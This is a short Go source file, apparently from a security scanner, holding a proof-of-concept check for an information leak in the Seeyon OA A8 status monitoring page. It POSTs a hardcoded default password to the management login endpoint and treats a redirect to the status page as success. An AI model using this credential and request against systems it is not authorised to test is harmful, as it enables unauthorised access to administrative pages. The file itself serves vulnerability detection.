package seeyon

import (
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"strings"
)

// A8 状态监控页面信息泄露

func ManagementStatus(u string, client *httpx.Client) bool {
	if req, err := client.Request(u+"/seeyon/management/index.jsp", "POST", "password=WLCCYBD@SEEYON", nil, "Poc SeeYon"); err == nil {
		if req.StatusCode == 302 && strings.Contains(req.Location, "status") {
			return true
		}
	}
	return false
}
